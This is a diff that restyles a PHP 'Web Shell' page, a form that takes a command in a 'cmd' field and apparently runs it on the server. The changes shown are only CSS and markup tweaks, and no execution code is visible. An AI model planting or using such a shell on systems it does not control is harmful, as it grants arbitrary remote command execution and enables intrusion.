@@ -24,28 +24,40 @@ set_time_limit(300);
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
-
     <title>Web Shell</title>
 
     <style>
+		html{}
+		body{font-family: Consolas,Monaco,'Andale Mono','Ubuntu Mono',monospace;}
         h2 {
             color: rgba(0, 0, 0, .75);
         }
 
         pre {
-            padding: 15px;
+            padding: 5px 15px;
             border-radius: 5px;
             background-color: #ECF0F1;
+			white-space: break-spaces;
+			font-size: 0.9rem;
         }
 
         .container {
             max-width:960px;
 			padding-bottom:20rem;
+			margin: 0 auto;
         }
 		.ce{cursor:pointer}
 		.ce:hover{background: aliceblue;}
-		.form-control{font-size:1rem}
+		.form-control{
+			font-size: 1rem;
+			padding: 0.4rem 1rem;
+			width: 50rem;
+		}
+		.button1{
+			font-size:1rem;
+			padding: 5px 15px;
+			margin: 15px 0 0;
+		}
     </style>
 
 </head>
@@ -54,7 +66,7 @@ set_time_limit(300);
 
     <div class="container">
 
-        <div class="pb-2 mt-4 mb-2">
+        <div class="">
 	    <h1>PHP Shell</h1>
             <h2> Execute a command </h2>
             <pre style="line-height:1">
@@ -89,7 +101,7 @@ set_time_limit(300);
                 <label for="cmd"><strong>Command</strong></label>
                 <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
             </div>
-            <button type="submit" class="btn btn-primary">Execute</button>
+            <button type="submit" class="button1">Execute</button>
         </form>
 
 <?php if ($cmd): ?>
